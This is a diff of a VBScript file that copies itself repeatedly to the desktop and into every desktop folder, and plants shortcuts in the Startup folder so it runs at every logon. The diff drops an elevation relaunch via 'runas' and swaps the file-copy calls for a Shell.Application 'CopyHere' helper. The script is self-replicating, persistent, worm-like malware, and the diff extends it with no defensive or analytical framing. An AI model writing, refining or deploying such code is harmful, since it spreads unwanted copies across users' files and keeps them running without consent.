@@ -1,6 +1,3 @@
-Set objShell = CreateObject("Shell.Application")
-objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
-
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 strScriptPath = WScript.ScriptFullName
 
@@ -16,7 +13,7 @@ For i = 1 To numCopies
     
     ' Create a copy of the script on the desktop
     strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
-    objFSO.CopyFile strCopyPath, strDesktopCopyPath, True ' Add "True" to overwrite existing files
+    CopyFileWithShell strCopyPath, strDesktopCopyPath
     
     ' Get the list of folders on the desktop
     Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
@@ -25,7 +22,7 @@ For i = 1 To numCopies
     ' Iterate through each folder and create a copy of the script
     For Each objFolder In colFolders
         strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
-        objFSO.CopyFile strCopyPath, strFolderCopyPath, True ' Add "True" to overwrite existing files
+        CopyFileWithShell strCopyPath, strFolderCopyPath
     Next
     
     ' Get the path to the startup folder
@@ -42,3 +39,10 @@ For i = 1 To numCopies
         objShortcut.Save
     Next
 Next
+
+Sub CopyFileWithShell(sourcePath, destinationPath)
+    Set objShell = CreateObject("Shell.Application")
+    Set sourceItem = objShell.Namespace(objFSO.GetParentFolderName(sourcePath)).ParseName(objFSO.GetFileName(sourcePath))
+    Set destinationItem = objShell.Namespace(objFSO.GetParentFolderName(destinationPath)).Self
+    destinationItem.CopyHere sourceItem
+End Sub
